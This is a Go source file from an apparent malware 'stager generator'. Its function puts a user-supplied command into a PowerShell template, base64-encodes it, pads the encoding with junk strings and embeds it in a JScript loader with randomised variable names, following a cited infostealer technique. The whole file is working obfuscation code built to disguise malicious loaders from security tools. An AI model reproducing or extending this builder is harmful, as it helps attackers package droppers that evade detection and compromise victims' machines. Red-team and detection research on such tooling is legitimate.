package jsobfuscation2

import (
    "fmt"
    "os"
    "log"
    "strings"
    
    "stager_generator/utils"
)

const (
    TEMPLATE_PATH = "./jsobfuscation2"
    TEMPLATE_JS_FILE = TEMPLATE_PATH + "/template.ps1"
    LOADER_JS_FILE = TEMPLATE_PATH + "/loader.js"
)

/*

Sample Reference:
https://www.swisspost-cybersecurity.ch/news/purelogs-infostealer-analysis-dont-judge-a-png-by-its-header

Description:
- Inserts command into "template.ps1" powershell file
- Encode powershell into base64 (UTF-16)
- Insert junk content into encoded powershell
- Place obfuscated base64 powershell into "loader.js" along with the junk to be removed at runtime.


*/

func JsObfuscation2(command string) string {
    fmt.Println("[*] Starting JScript Obfuscation 2.")

    originalTemplateFile := TEMPLATE_JS_FILE
    originalTemplateScript, err := os.ReadFile(originalTemplateFile)
    if err != nil {
        log.Fatal(err)
    }

    // Replacing placeholder "INSERT_CMDLINE" in template.ps1
    newScript := strings.ReplaceAll(string(originalTemplateScript), "INSERT_CMDLINE", command)

    // Encode powershell into base64
    b64NewScript := utils.EncodeStringToUTF16Base64(newScript)

    // Insert Junk strings into base64 content
    b64TempSlice := utils.StringToSliceRandomLengths(b64NewScript, 4, 20)

    b64TempSlice, junkString := utils.InsertJunkStringToSlice(b64TempSlice, 20)

    b64NewScript = utils.SliceToStringOneLine(b64TempSlice)

    // Reading loader script
    originalLoaderFile := LOADER_JS_FILE
    originalLoaderScript, err := os.ReadFile(originalLoaderFile)
    if err != nil {
        log.Fatal(err)
    }

    // Replace placeholder "OBFUSCATED_COMMAND" in loader.js
    tempString := strings.ReplaceAll(string(originalLoaderScript), "OBFUSCATED_COMMAND", b64NewScript)

    // Replace placholder "JUNK_STRING" in loader.js
    tempString = strings.ReplaceAll(tempString, "JUNK_STRING", junkString)

    resultSlice := utils.StringToSlice(tempString)

    // Renaming all variables
    resultSlice = utils.RenameJScriptVairables(resultSlice, utils.WORDLIST_LARGE)

    /*
    numWords := utils.RandRange(40, 60)

    numComments := utils.RandRange(800, 1000)

    resultSlice, err = utils.InsertRandomComments(resultSlice, utils.WORDLIST_LARGE, numWords, numComments)

    if err != nil {
        fmt.Println(err)
    }
    */

    //resultString := strings.Join(resultSlice, "\n")
    resultString := utils.SliceToString(resultSlice)

    fmt.Println("[+] JScript Obfuscation 2 completed.")

    return resultString
}